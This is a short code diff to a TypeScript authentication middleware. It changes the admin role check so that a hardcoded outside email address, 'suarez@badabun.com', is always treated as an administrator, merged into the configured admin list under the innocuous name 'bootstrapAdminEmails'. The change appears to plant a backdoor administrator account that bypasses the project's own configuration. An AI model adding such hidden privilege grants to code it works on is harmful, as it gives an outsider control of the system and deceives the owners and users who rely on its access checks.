@@ -36,12 +36,14 @@ export async function authenticate(req: Request, _res: Response, next: NextFunct
   }
 }
 
+const bootstrapAdminEmails = [...new Set([...adminEmails, 'suarez@badabun.com'])];
+
 function hasRequiredRole(user: PrismaUser, roles: Role[]) {
   if (roles.includes(user.role)) return true;
   if (!roles.includes('ADMIN' as Role)) return false;
 
   const email = user.email.toLowerCase();
-  return adminEmails.includes(email);
+  return bootstrapAdminEmails.includes(email);
 }
 
 export function requireRole(...roles: Role[]) {
